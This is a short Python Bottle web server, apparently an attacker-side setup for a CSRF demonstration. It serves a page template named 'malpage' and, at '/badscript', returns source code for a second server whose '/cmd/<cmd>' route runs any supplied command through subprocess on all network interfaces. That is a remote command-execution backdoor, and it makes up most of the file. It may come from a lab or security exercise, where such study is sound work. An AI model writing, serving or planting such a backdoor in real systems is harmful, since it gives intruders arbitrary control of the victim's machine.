from bottle import *

PORT=8090

@route('/static/<filepath:path>')
def server_static(filepath):
    return static_file(filepath, root='static')

@get('/csrf')
def index():
    return template('malpage')

@get('/badscript')
def index():
    return '''
from bottle import *
@get('/cmd/<cmd>')
def index(cmd):
    import subprocess
    return subprocess.run([cmd], stdout=subprocess.PIPE).stdout
run(host='0.0.0.0', port=9099)
'''

run(host='0.0.0.0', port=PORT, debug=True)

